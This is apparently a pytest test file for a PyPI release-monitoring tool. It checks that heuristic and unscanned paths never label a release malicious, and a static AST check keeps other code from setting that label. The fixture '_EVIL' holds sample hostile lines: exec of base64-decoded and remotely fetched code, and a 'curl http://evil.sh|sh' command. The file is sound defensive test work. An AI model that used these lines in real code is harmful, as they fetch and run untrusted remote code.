"""Only the model (or a person) says "malicious".

Deterministic checks may clear a release or escalate it, but never label it malicious: heuristic alerts are
`suspicious-heuristic`, and an unscanned release records `suspicious` with model 'none'. These tests pin that
on every non-LLM path, and a static check stops new code from minting a malicious Verdict outside the two
sanctioned places: the reviewer's model-JSON parser and the human `adjudicate` label."""
import ast
import dataclasses
import json
from pathlib import Path

import pytest

from pydiffwatch import fetcher, orchestrator, reviewer, store
from pydiffwatch.config import Config
from pydiffwatch.models import (ArtifactSet, Diff, FileDiff, FiredRule, Hunk, NewRelease, TriageResult)

# If any path below wrongly consulted the model, this backend would make the verdict malicious.
_MALICIOUS_JSON = json.dumps({"classification": "malicious", "confidence": 0.99, "urgent": True,
                              "recommended_action": "report-to-pypi", "attack_type": "install-hook-rce",
                              "cited_hunk": "setup.py:1", "reasoning": "x", "runs_when": "install"})


class _Backend:
    primary_model, escalation_model = "m", None

    def __init__(self, fail=False):
        self.fail = fail

    def complete(self, **kw):
        if self.fail:
            raise reviewer.ReviewUnavailable("down")
        return _MALICIOUS_JSON


def _cfg(tmp_path, **kw):
    c = Config(db_path=tmp_path / "db.sqlite", lock_path=tmp_path / "l", cache_dir=tmp_path / "c",
               rules_dir=Path(__file__).resolve().parents[1] / "rules/community", **kw)
    return dataclasses.replace(c, reviewer=dataclasses.replace(c.reviewer, host_memory_guard=False))


def _conn(cfg):
    conn = store.connect(cfg); store.init_schema(conn)
    return conn


def _assert_never_malicious(conn, stage=None):
    verdicts = [r[0] for r in conn.execute("SELECT classification FROM verdicts")]
    alerts = conn.execute("SELECT classification, dedupe_key FROM alerts").fetchall()
    assert alerts, "the path under test must have alerted"
    assert "malicious" not in verdicts
    assert "malicious" not in [a["classification"] for a in alerts]
    if stage:     # the outcome under test really ran
        assert any(a["dedupe_key"].endswith(f"unscanned:{stage}") for a in alerts)


# --- heuristic-only mode -------------------------------------------------------------------------------

_EVIL = (b"import os, base64, requests\n"
         b"exec(base64.b64decode(B))\n"
         b"exec(requests.get(U).text)\n"
         b"os.system('curl http://evil.sh|sh')\n")


def test_heuristic_only_high_score_is_suspicious_heuristic_not_malicious(tmp_path):
    cfg = _cfg(tmp_path, reviewer_enabled=False)
    conn = _conn(cfg)
    art = ArtifactSet("p", "1.1", "1.0", "sdist", {"setup.py": _EVIL, "p/__init__.py": _EVIL},
                      {"setup.py": b"x = 1\n", "p/__init__.py": b""}, {}, added_binaries=[],
                      is_new_package=False, maintainer_metadata=None, added_dep_findings=[])
    orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
    score = conn.execute("SELECT triage_score FROM releases WHERE version='1.1'").fetchone()[0]
    assert score >= 150                  # far past threshold_t: the strongest heuristic case
    assert store.get_stage(conn, "p", "1.1") == "alerted"
    _assert_never_malicious(conn)


# --- every unscanned outcome ---------------------------------------------------------------------------

@pytest.mark.parametrize("result, stage", [
    (fetcher.RefusedToFetch("download-size"), "refused_to_fetch"),
    (fetcher.RefusedToFetch("quarantined"), "refused_to_fetch"),
    (fetcher.RefusedToExtract("members"), "refused_to_extract"),
    (fetcher.MetadataGone("404"), "metadata_gone"),
])
def test_fetch_outcomes_never_malicious(tmp_path, result, stage):
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    orchestrator._process_fetched(cfg, conn, None, None, NewRelease("p", "1.1", 5), result)
    _assert_never_malicious(conn, stage)


def test_switch_to_wheel_only_never_malicious(tmp_path):
    cfg = _cfg(tmp_path, wheel_only_grace_minutes=0)
    conn = _conn(cfg)
    for _ in range(2):   # the first tick waits out the (zero) grace, the second warns
        orchestrator._process_fetched(cfg, conn, None, None, NewRelease("p", "1.1", 5),
                                      fetcher.NoSdist(switched_from="1.0"))
    _assert_never_malicious(conn, "no_sdist")


def test_gave_up_never_malicious(tmp_path):
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    for _ in range(store.METADATA_ATTEMPTS):
        orchestrator._process_fetched(cfg, conn, None, None, NewRelease("p", "1.1", 5), RuntimeError("boom"))
    _assert_never_malicious(conn, "gave_up")


_DIFF = Diff("p", "1.1", False, [FileDiff("setup.py", "modified", [Hunk((0, 1), (0, 1), ["exec(x)"], [])])], [])
_TR = TriageResult(200.0, [FiredRule("autoexec-location", 200.0, "setup.py", (1, 1))], True)


def _escalate(tmp_path, diff=_DIFF, tr=_TR, fail=False, offline=False, **rv):
    cfg = _cfg(tmp_path)
    cfg = dataclasses.replace(cfg, reviewer=dataclasses.replace(cfg.reviewer, **rv))
    conn = _conn(cfg)
    rid = store.record_release(conn, "p", "1.1", 5, False, "1.0", "sdist")
    rvw = reviewer.Reviewer(cfg, backend=_Backend(fail=fail))
    orchestrator._review_escalated(cfg, conn, rvw, diff, tr, rid, offline=offline)
    return conn


def test_too_large_never_malicious(tmp_path):
    big = Diff("p", "1.1", False, [FileDiff("setup.py", "modified", [Hunk((0, 1), (0, 1), ["x" * 50_000], [])])], [])
    _assert_never_malicious(_escalate(tmp_path, diff=big, max_input_chars=10_000), "too_large")


def test_review_failed_exhausted_never_malicious(tmp_path):
    _assert_never_malicious(_escalate(tmp_path, fail=True, max_review_attempts=1), "review_failed")


def test_reviewer_with_no_content_records_model_none_suspicious(tmp_path):
    tr = TriageResult(200.0, [FiredRule("maintainer-set-change", 200.0, "<ownership>", (0, 0))], True)
    conn = _escalate(tmp_path, diff=Diff("p", "1.1", False, [], []), tr=tr)
    row = conn.execute("SELECT classification, model FROM verdicts").fetchone()
    assert (row["classification"], row["model"]) == ("suspicious", "none")
    _assert_never_malicious(conn, "no_content")


# --- the LLM-unavailable park path ---------------------------------------------------------------------

def test_endpoint_unreachable_park_never_malicious(tmp_path):
    conn = _escalate(tmp_path, offline=True)
    assert store.pending_reviews(conn)[0]["pending_reason"] == "endpoint_unreachable"
    _assert_never_malicious(conn)


def test_llm_down_with_retries_left_never_malicious(tmp_path):
    conn = _escalate(tmp_path, fail=True, max_review_attempts=3)
    assert store.pending_reviews(conn)[0]["pending_reason"] == "review_failed"
    _assert_never_malicious(conn)


# --- static: nothing else mints a malicious Verdict ----------------------------------------------------

PKG = Path(__file__).resolve().parents[1] / "pydiffwatch"
# The only places a Verdict's classification may come from something other than a literal:
#   reviewer.py _call  — the model's JSON -> Verdict parser (the LLM's own label)
#   orchestrator.py adjudicate — a person's label from `pydiffwatch adjudicate`
ALLOWED_NON_LITERAL = {("reviewer.py", "_call"), ("orchestrator.py", "adjudicate")}


def _classification_arg(call):
    """(callee name, classification expression) for a Verdict / dataclasses.replace / store.record_alert
    call; the expression is None when it isn't passed explicitly."""
    fn = call.func
    name = fn.id if isinstance(fn, ast.Name) else fn.attr if isinstance(fn, ast.Attribute) else None
    kw = next((k.value for k in call.keywords if k.arg == "classification"), None)
    if name in ("Verdict", "record_alert"):   # classification is the 3rd positional arg of both
        return name, kw if kw is not None else (call.args[2] if len(call.args) > 2 else None)
    return name, kw if name == "replace" else None


def violations(source, filename):
    out = []

    def walk(node, func):
        for child in ast.iter_child_nodes(node):
            f = child.name if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef)) else func
            if isinstance(child, ast.Call):
                name, arg = _classification_arg(child)
                sanctioned = (filename, func) in ALLOWED_NON_LITERAL
                unpacked = any(isinstance(a, ast.Starred) for a in child.args) or \
                    any(k.arg is None for k in child.keywords)
                if name == "Verdict" and unpacked and not sanctioned:
                    out.append(f"{filename}:{child.lineno} Verdict(*args/**kw) in {func}()")
                if isinstance(arg, ast.Constant):
                    if arg.value == "malicious":
                        out.append(f"{filename}:{child.lineno} literal 'malicious' classification")
                # record_alert's classification is the emitted verdict's (notifier.emit): only literals checked
                elif arg is not None and name != "record_alert" and not sanctioned:
                    out.append(f"{filename}:{child.lineno} non-literal classification in {func}()")
            walk(child, f)

    walk(ast.parse(source), None)
    return out


def test_static_check_catches_a_planted_violation():
    bad = "def f():\n    return Verdict('p', '1', 'malicious', 0, [], True)\n"
    assert violations(bad, "orchestrator.py")
    assert violations("def g(v):\n    return dataclasses.replace(v, classification='malicious')\n", "x.py")
    assert violations("def h(c):\n    return Verdict('p', '1', c, 0, [], True)\n", "notifier.py")
    assert violations("def i(c):\n    store.record_alert(c, 1, 'malicious', 0, '[]', 'k')\n", "notifier.py")
    assert violations("def j(c):\n    record_alert(c, 1, classification='malicious')\n", "notifier.py")
    assert violations("def k(a):\n    return Verdict(*a)\n", "orchestrator.py")
    assert violations("def m(kw):\n    return Verdict(**kw)\n", "orchestrator.py")
    # the sanctioned places may pass a non-literal classification
    assert not violations("def _call(d):\n    return Verdict(classification=d['c'])\n", "reviewer.py")


def test_no_code_outside_the_model_parser_or_adjudicate_mints_malicious():
    found = [v for p in sorted(PKG.glob("*.py")) for v in violations(p.read_text(), p.name)]
    assert found == []


def test_one_oversized_source_alone_goes_to_no_content_not_malicious(tmp_path):
    # A PKG-INFO bump (not a build file) plus one oversized .py: triage escalates (weight 40), the model has
    # nothing readable to see, so the release is a model-`none` UNREVIEWED item, never malicious.
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    art = ArtifactSet("p", "1.1", "1.0", "sdist", {"PKG-INFO": b"Version: 1.1\n"}, {"PKG-INFO": b"Version: 1.0\n"},
                      {}, added_binaries=[{"path": "p/big.py", "size": 5_000_000, "reason": "source-too-large",
                                           "sha256": "ab"}],
                      is_new_package=False, maintainer_metadata=None, added_dep_findings=[], too_large=("p/big.py",))
    rvw = reviewer.Reviewer(cfg, backend=_Backend())
    orchestrator._process_fetched(cfg, conn, rvw, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
    assert store.get_stage(conn, "p", "1.1") == "needs_adjudication"
    row = conn.execute("SELECT classification, model FROM verdicts").fetchone()
    assert (row["classification"], row["model"]) == ("suspicious", "none")
    _assert_never_malicious(conn, "no_content")
